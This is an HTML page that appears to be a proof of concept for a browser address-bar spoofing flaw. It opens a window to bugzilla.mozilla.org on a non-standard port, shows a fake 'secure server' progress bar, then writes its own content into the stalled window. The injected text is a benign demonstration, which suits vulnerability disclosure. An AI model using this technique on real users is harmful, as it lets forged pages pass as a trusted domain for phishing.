<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Navigation State Test</title>

<style>

body{
font-family:Arial;
text-align:center;
margin-top:120px;
}

button{
padding:14px 28px;
font-size:18px;
}

#loader{
margin-top:30px;
display:none;
}

#progress{
width:320px;
height:20px;
border:1px solid #ccc;
margin:auto;
}

#bar{
width:0%;
height:100%;
background:#4CAF50;
}

</style>
</head>

<body>

<h2>Navigation Desync Test</h2>

<button onclick="start()">Start Test</button>

<div id="loader">

<p>Connecting to secure server...</p>

<div id="progress">
<div id="bar"></div>
</div>

</div>

<script>

function start(){

document.getElementById("loader").style.display="block";

let win = window.open("https://bugzilla.mozilla.org:90");

let bar=document.getElementById("bar");
let width=0;

let interval=setInterval(function(){

if(width>=100){

clearInterval(interval);

inject(win);

}else{

width+=2;
bar.style.width=width+"%";

}

},140);

}

function inject(win){

try{

win.document.open();

win.document.write(`
<html>
<body style="font-family:Arial;text-align:center;margin-top:120px;">
<h2>Navigation State Demonstration</h2>
<p>This content was injected after delayed navigation failure.</p>
<p>If the address bar still shows the original domain, this demonstrates a navigation state issue.</p>
</body>
</html>
`);

win.document.close();

}catch(e){

alert("Injection blocked by browser security.");

}

}

</script>

</body>
</html>
